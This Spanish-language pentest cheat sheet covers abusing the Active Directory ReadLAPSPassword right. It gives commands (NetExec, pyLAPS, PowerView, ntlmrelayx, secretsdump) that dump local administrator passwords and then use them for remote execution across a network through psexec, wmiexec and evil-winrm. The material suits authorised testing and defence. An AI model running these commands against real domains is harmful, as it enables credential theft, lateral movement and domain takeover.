## ReadLAPSPassword — Lectura de Contraseñas LAPS

**LAPS (Local Administrator Password Solution)** es una solución de Microsoft que gestiona automáticamente las contraseñas del administrador local en los equipos del dominio, rotándolas periódicamente y almacenándolas en atributos del objeto de equipo en AD.

Existen dos versiones:

| Versión | Atributo donde se almacena | Formato |
| ------- | -------------------------- | ------- |
| Legacy LAPS | `ms-Mcs-AdmPwd` | Texto plano |
| Windows LAPS (2023+) | `msLAPS-Password` / `msLAPS-EncryptedPassword` | Texto plano o cifrado |

Si un usuario tiene el edge **ReadLAPSPassword** en BloodHound sobre un equipo, puede leer la contraseña del administrador local de ese equipo — lo que equivale a acceso administrativo completo sobre la máquina.

---

## Enumeración — Identificar equipos con LAPS y quién puede leerlo

```shell
# Identificar equipos con LAPS habilitado (campo de expiración presente)
bloodyAD --host <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# Via ldapsearch
ldapsearch -x -H ldap://<ip_dc> \
  -D "<usuario>@<dominio>" -w <contraseña> \
  -b "dc=<dominio>,dc=<tld>" \
  "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd

# Con LAPSToolkit (Windows) — muestra quién puede leer cada contraseña
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

---

## Leer la contraseña LAPS

### Desde Linux (externamente — recomendado)

```shell
# NetExec via LDAP — vuelca todas las contraseñas LAPS accesibles
nxc ldap <ip_dc> -d <dominio> -u <usuario> -p <contraseña> -M laps

# Filtrar por nombre de equipo o wildcard
nxc ldap <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  -M laps -O computer='<nombre_equipo>'
nxc ldap <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  -M laps -O computer='WKSTN-*'

# Con hash NT (Pass-the-Hash)
nxc ldap <ip_dc> -d <dominio> -u <usuario> -H <hash_nt> -M laps

# pyLAPS — leer contraseñas de todos los equipos
pyLAPS.py --action get -u <usuario> -d <dominio> -p <contraseña> --dc-ip <ip_dc>

# BloodyAD — Legacy LAPS
bloodyAD --host <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# ntlmrelayx — volcar LAPS durante un relay
ntlmrelayx.py -t ldap://<ip_dc> --dump-laps
```

### Desde Windows (internamente)

```powershell
# Con PowerView
Get-DomainComputer '<nombre_equipo>' -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"

# Todos los equipos con LAPS habilitado
Get-DomainComputer -Filter '(ms-MCS-AdmPwd=*)' -Properties name,ms-MCS-AdmPwd

# Con el módulo LAPS de Microsoft (si está instalado)
Get-AdmPwdPassword -ComputerName <nombre_equipo>

# Con LAPSToolkit
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

---

## Usar la contraseña obtenida

Una vez obtenida la contraseña del administrador local, usarla para conectarse al equipo objetivo:

```shell
# Ejecución remota via SMB
psexec.py '<dominio>/administrator:<contraseña_laps>'@<ip_equipo>
wmiexec.py '<dominio>/administrator:<contraseña_laps>'@<ip_equipo>

# Con NetExec — verificar si la contraseña es válida en varios equipos
nxc smb <red>/24 -u administrator -p '<contraseña_laps>' --local-auth

# Evil-WinRM si WinRM está habilitado
evil-winrm -i <ip_equipo> -u administrator -p '<contraseña_laps>'

# Usando el flag --laps directamente en NetExec
# (NetExec lee LAPS y se autentica automáticamente)
nxc smb <ip_equipo> -u <usuario_con_readlaps> -p <contraseña> --laps
nxc smb <red>/24 -u <usuario_con_readlaps> -p <contraseña> --laps
```

---

## SyncLAPSPassword — Vector adicional

Si el usuario tiene los derechos de replicación `DS-Replication-Get-Changes` combinados con `DS-Replication-Get-Changes-In-Filtered-Set`, puede sincronizar el atributo `ms-Mcs-AdmPwd` via DCSync:

```shell
secretsdump.py '<dominio>/<usuario>:<contraseña>'@<ip_dc> \
  -just-dc-user '<equipo_objetivo>$'
```

BloodHound muestra este vector como el edge **SyncLAPSPassword**.

---

> 💡 **ReadLAPSPassword** sobre un Domain Controller equivale directamente a Domain Admin — la contraseña del administrador local del DC permite acceso total a la máquina más crítica del dominio. Es uno de los primeros edges a buscar en BloodHound tras comprometer cualquier cuenta.

---

### Referencias

- https://bloodhound.specterops.io/resources/edges/read-laps-password
- https://www.thehacker.recipes/ad/movement/dacl/readlapspassword
- https://www.hackingarticles.in/credential-dumping-laps/
- https://github.com/p0dalirius/pyLAPS
- https://github.com/leoloobeek/LAPSToolkit
